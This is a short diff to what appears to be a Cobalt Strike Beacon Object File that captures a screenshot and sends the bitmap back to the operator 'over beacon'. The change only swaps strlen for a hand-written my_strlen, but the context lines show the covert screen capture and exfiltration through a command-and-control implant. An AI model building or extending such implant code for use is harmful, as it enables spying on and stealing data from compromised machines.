@@ -6,6 +6,16 @@
 #pragma comment(lib, "Gdi32.lib")
 
 char downloadfilename[] = "screenshot.bmp";
+
+//i love chatgpt
+size_t my_strlen(const char* str) {
+    size_t len = 0;
+    while (str[len] != '\0') {
+        len++;
+    }
+    return len;
+}
+
 /*Download File*/
 void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize) {
 
@@ -238,7 +248,7 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod)
     }
     else{
         BeaconPrintf(0x0, "[*] Downloading bitmap over beacon with filename %s", lpszFileName);
-        downloadFile((char*)lpszFileName, strlen(lpszFileName), (char*)bmpdata, (int)(sizeof(BITMAPFILEHEADER) + dwDIBSize));
+        downloadFile((char*)lpszFileName, my_strlen(lpszFileName), (char*)bmpdata, (int)(sizeof(BITMAPFILEHEADER) + dwDIBSize));
     }
     
     
